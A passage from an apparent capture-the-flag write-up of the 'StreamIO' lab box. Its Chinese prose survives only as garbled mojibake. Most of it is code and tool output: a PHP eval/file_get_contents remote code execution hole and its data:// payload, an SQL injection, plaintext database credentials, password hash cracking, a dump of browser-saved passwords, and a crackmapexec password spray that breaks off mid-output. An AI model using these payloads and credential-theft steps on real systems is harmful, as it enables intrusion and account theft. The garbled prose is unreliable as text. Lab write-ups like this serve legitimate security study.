class="variable">$query</span> = <span class="string">&quot;select * from movies order by movie&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="variable">$res</span>, SQLSRV_FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 3<span class="title">rem</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">h4</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">left</span>;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">movie</span>&#x27;]; ?&gt;&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">right</span>;<span class="title">padding</span>-<span class="title">right</span>: 25<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;?<span class="title">movie</span>=&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">movie_id</span>&quot; <span class="title">value</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">id</span>&#x27;]; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">sm</span> <span class="title">btn</span>-<span class="title">primary</span>&quot; <span class="title">value</span>=&quot;<span class="title">Delete</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125; # <span class="title">while</span> <span class="title">end</span></span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;&lt;<span class="title">hr</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h1</span>&gt;<span class="title">Staff</span> <span class="title">managment</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!<span class="title">defined</span>(&#x27;<span class="title">included</span>&#x27;))</span></span><br><span class="line"><span class="class">	<span class="title">die</span>(&quot;<span class="title">Only</span> <span class="title">accessable</span> <span class="title">through</span> <span class="title">includes</span>&quot;);</span></span><br><span class="line"><span class="class">$<span class="title">query</span> = &quot;<span class="title">select</span> * <span class="title">from</span> <span class="title">users</span> <span class="title">where</span> <span class="title">is_staff</span> = 1 &quot;;</span></span><br><span class="line"><span class="class">$<span class="title">res</span> = <span class="title">sqlsrv_query</span>($<span class="title">handle</span>, $<span class="title">query</span>, <span class="title">array</span>(), <span class="title">array</span>(&quot;<span class="title">Scrollable</span>&quot;=&gt;&quot;<span class="title">buffered</span>&quot;));</span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">staff_id</span>&#x27;]))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">alert</span> <span class="title">alert</span>-<span class="title">success</span>&quot;&gt; <span class="title">Message</span> <span class="title">sent</span> <span class="title">to</span> <span class="title">administrator</span>&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">query</span> = &quot;<span class="title">select</span> * <span class="title">from</span> <span class="title">users</span> <span class="title">where</span> <span class="title">is_staff</span> = 1&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">res</span> = <span class="title">sqlsrv_query</span>($<span class="title">handle</span>, $<span class="title">query</span>, <span class="title">array</span>(), <span class="title">array</span>(&quot;<span class="title">Scrollable</span>&quot;=&gt;&quot;<span class="title">buffered</span>&quot;));</span></span><br><span class="line"><span class="class"><span class="title">while</span>($<span class="title">row</span> = <span class="title">sqlsrv_fetch_array</span>($<span class="title">res</span>, <span class="title">SQLSRV_FETCH_ASSOC</span>))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 3<span class="title">rem</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">h4</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">left</span>;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">username</span>&#x27;]; ?&gt;&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">right</span>;<span class="title">padding</span>-<span class="title">right</span>: 25<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">staff_id</span>&quot; <span class="title">value</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">id</span>&#x27;]; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">sm</span> <span class="title">btn</span>-<span class="title">primary</span>&quot; <span class="title">value</span>=&quot;<span class="title">Delete</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125; # <span class="title">while</span> <span class="title">end</span></span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;&lt;<span class="title">hr</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h1</span>&gt;<span class="title">User</span> <span class="title">managment</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!<span class="title">defined</span>(&#x27;<span class="title">included</span>&#x27;))</span></span><br><span class="line"><span class="class">	<span class="title">die</span>(&quot;<span class="title">Only</span> <span class="title">accessable</span> <span class="title">through</span> <span class="title">includes</span>&quot;);</span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">user_id</span>&#x27;]))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;delete from users where is_staff = 0 and id = &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from users where is_staff = 0&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="variable">$res</span>, SQLSRV_FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 3<span class="title">rem</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">h4</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">left</span>;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">username</span>&#x27;]; ?&gt;&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">right</span>;<span class="title">padding</span>-<span class="title">right</span>: 25<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_id</span>&quot; <span class="title">value</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">id</span>&#x27;]; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">sm</span> <span class="title">btn</span>-<span class="title">primary</span>&quot; <span class="title">value</span>=&quot;<span class="title">Delete</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125; # <span class="title">while</span> <span class="title">end</span></span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;&lt;<span class="title">hr</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">include</span>&quot; <span class="title">hidden</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">include</span>&#x27;]))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] !== <span class="string">&quot;index.php&quot;</span> ) </span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>]));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot; ---- ERROR ---- &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„çœ‹æœ€ä¸‹é¢è¿™éƒ¨åˆ†phpä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] !== <span class="string">&quot;index.php&quot;</span> ) </span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>]));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot; ---- ERROR ---- &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‡è®¾æˆ‘ä»¬ä¼ å…¥çš„includeå‚æ•°æ˜¯<code>data://text/plain,phpinfo();</code>ï¼Œé‚£ä¹ˆç»è¿‡<code>file_get_contents()</code>å‡½æ•°çš„å¤„ç†å†ä¼ ç»™evalå‡½æ•°ï¼Œä¸å°±ç›´æ¥æ‰§è¡Œäº†phpinfo()äº†å—ï¼Ÿæˆ‘ä»¬è¯•ä¸€ä¸‹ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f77c458853aef549a27.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f77c458853aef549a27.jpg"></a></p>
<p>æœä¸å…¶ç„¶ï¼Œå‡ºç°äº†phpinfoã€‚é‚£æ¥ä¸‹æ¥æ›´æ”¹<code>phpinfo();</code>ä¸º<code>system(&#39;command&#39;)</code>å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æˆ‘è¿™é‡Œæ˜¯ä¸Šä¼ äº†ä¸€ä¸ªwebshellï¼Œç„¶ååˆ©ç”¨èšå‰‘è¿æ¥ã€‚å½“å‰ç”¨æˆ·æ˜¯<code>yoshihide</code>ä¸”æ²¡æœ‰å®¶ç›®å½•ï¼Œä»…ç”¨äºWebåº”ç”¨æ“ä½œã€‚ä¹‹åå®¡è®¡äº†ä¸€ä¸‹ä»£ç ï¼Œå¾—åˆ°äº†ä¸¤å¯¹mssqlçš„è´¦å·å¯†ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#C:/inetpub/streamio.htb/admin/index.php</span></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">array</span>(<span class="string">&quot;Database&quot;</span>=&gt;<span class="string">&quot;STREAMIO&quot;</span>, <span class="string">&quot;UID&quot;</span> =&gt; <span class="string">&quot;db_admin&quot;</span>, <span class="string">&quot;PWD&quot;</span> =&gt; <span class="string">&#x27;B1@hx31234567890&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#C:/inetpub/watch.streamio.htb/search.php</span></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">array</span>(<span class="string">&quot;Database&quot;</span>=&gt;<span class="string">&quot;STREAMIO&quot;</span>, <span class="string">&quot;UID&quot;</span> =&gt; <span class="string">&quot;db_user&quot;</span>, <span class="string">&quot;PWD&quot;</span> =&gt; <span class="string">&#x27;B1@hB1@hB1@h&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨èšå‰‘çš„æ•°æ®æ“ä½œçš„åŠŸèƒ½ï¼Œå¯ä»¥ç›´æ¥è¿æ¥åˆ°mssqlï¼ˆä¹Ÿå¯ä»¥å®éªŒsqlcmdè¿æ¥ï¼Œæ‰§è¡Œwhere.exe sqlcmdå³å¯æ‰¾åˆ°sqlcmdçš„ä½ç½®ï¼‰ï¼ŒæŸ¥çœ‹streamio_backupè¡¨ä¸­çš„æ•°æ®ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f82c458853aef54abf6.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f82c458853aef54abf6.jpg"></a></p>
<p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€æ¡usernameä¸ºnikk37çš„æ•°æ®ï¼Œåˆ©ç”¨èšå‰‘çš„å¯¼å‡ºåŠŸèƒ½å¯¼å‡ºç»“æœï¼Œå¾—åˆ°äº†ä¸€ä¸ªcsvæ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> 10.10.11.158_20231210123309.csv </span><br><span class="line"><span class="built_in">id</span>,username,password</span><br><span class="line">8,Sabrina,f87d3c0d6c8fd686aacc6627f1f493a5</span><br><span class="line">7,William,d62be0dc82071bccc1322d64ec5b6c51</span><br><span class="line">6,Lauren,08344b85b329d7efd611b7a7743e8a09</span><br><span class="line">5,Samantha,083ffae904143c4796e464dac33c1f7d</span><br><span class="line">4,Theodore,925e5408ecb67aea449373d668b7359e</span><br><span class="line">3,James,c660060492d9edcaa8332d89c99c9239</span><br><span class="line">2,yoshihide,b779ba15cedfd22a023c4d8bcf5f2332</span><br><span class="line">1,nikk37,389d14cb8e4e9b94b137deb1caf0612a</span><br></pre></td></tr></table></figure>

<p>ä¾ç„¶å¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå¹¶çˆ†ç ´å¯†ç ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hashcat account /usr/share/wordlists/rockyou.txt --username -m 0 --show </span></span><br><span class="line">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$</span><br><span class="line">Lauren:08344b85b329d7efd611b7a7743e8a09:<span class="comment">##123a8j8w5123##</span></span><br><span class="line">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..</span><br><span class="line">nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com</span><br></pre></td></tr></table></figure>

<p>å°è¯•åˆ©ç”¨evil-winrmå’Œ<code>nikk37:get_dem_girls2@yahoo.com</code>è¿›è¡Œç™»å½•ï¼ŒæˆåŠŸç™»å½•ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f8cc458853aef54bf54.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f8cc458853aef54bf54.jpg"></a></p>
<h2 id="GetAdministrator"><a href="#GetAdministrator" class="headerlink" title="GetAdministrator"></a>GetAdministrator</h2><p>é¦–å…ˆä¸Šä¼ ä¸€ä¸ªSharpHound.exeè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f99c458853aef54d8a9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f99c458853aef54d8a9.jpg"></a></p>
<p>æ¥ç€ä¸‹è½½ç”Ÿæˆçš„zipæ–‡ä»¶å¹¶å¯¼å…¥åˆ°BloodHoundï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fa4c458853aef54eeaa.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fa4c458853aef54eeaa.jpg"></a></p>
<p>å›¾ä¸­æ‰€æŒ‡çš„ç”¨æˆ·ä¸ºjdgoddï¼Œæ‰€æŒ‡çš„ç»„ä¸ºcore staffã€‚å¯ä»¥çœ‹åˆ°jdgoddå¯¹core staffæœ‰writeownerçš„æƒé™ï¼Œè€Œcore staffçš„ç»„æˆå‘˜å¯ä»¥è¯»å–LAPSçš„å¯†ç ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°core staffç»„ä¸­æ˜¯æ²¡æœ‰æˆå‘˜çš„ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fb7c458853aef550a56.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fb7c458853aef550a56.jpg"></a></p>
<p>å› æ­¤æˆ‘ä»¬æ­¤æ—¶çš„æ€è·¯æ˜¯æ‹¿åˆ°jdgoddçš„å¯†ç ç„¶åç™»å½•åˆ°DCï¼Œä¹‹åå°†jdgoddæˆ–è€…nikk37æ·»åŠ åˆ°core staffç»„ä¸­ï¼Œæœ€ådump LAPSå¯†ç ã€‚é‚£é¦–å…ˆè¿›è¡Œæˆ‘ä»¬çš„ç¬¬ä¸€æ­¥ï¼Œæ‰¾åˆ°jdgoddå¯†ç ã€‚ä¸Šä¼ ä¸€ä¸ªWinpeasè¿è¡Œä¸€ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°çº¿ç´¢ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fc1c458853aef55189c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fc1c458853aef55189c.jpg"></a></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™å°ç”µè„‘å®‰è£…äº†firefoxä¸”æ‰¾åˆ°äº†firefoxçš„å‡­æ®æ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a>æŠŠå¯†ç dumpå‡ºæ¥ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fcac458853aef552d57.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fcac458853aef552d57.jpg"></a></p>
<p>ä¸‹è½½ä¸‹æ¥å¹¶è§£å‹åï¼Œå°±å¯ä»¥çœ‹åˆ°å¯†ç äº†ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> results/firefox_br53rxeg_default_release_password.json </span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;JDgodd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;password@12&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:41:51-08:00&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;yoshihide&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;paddpadd@12&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:41:24-08:00&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;nikk37&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;n1kk1sd0p3t00:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:41:10-08:00&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;JDg0dd1s@d0p3cr3@t0r&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:40:56-08:00&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ç›´æ¥åˆ©ç”¨<code>JDgodd:password@12</code>æ— æ³•è®¤è¯æˆåŠŸï¼Œä¼¼ä¹è¿˜éœ€è¦æˆ‘ä»¬é‡æ–°çˆ†ç ´ä¸€ä¸‹ã€‚æ•´ç†ä¸€ä¸‹è´¦å·å¯†ç ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fd5c458853aef5545e2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fd5c458853aef5545e2.jpg"></a></p>
<p>åˆ©ç”¨cmeçˆ†ç ´ä¸€ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crackmapexec smb 10.10.11.158 -u user1 -p pass1 --continue-on-success</span></span><br><span class="line">SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:password@12 STATUS_LOGON_FAILURE </span><br><span 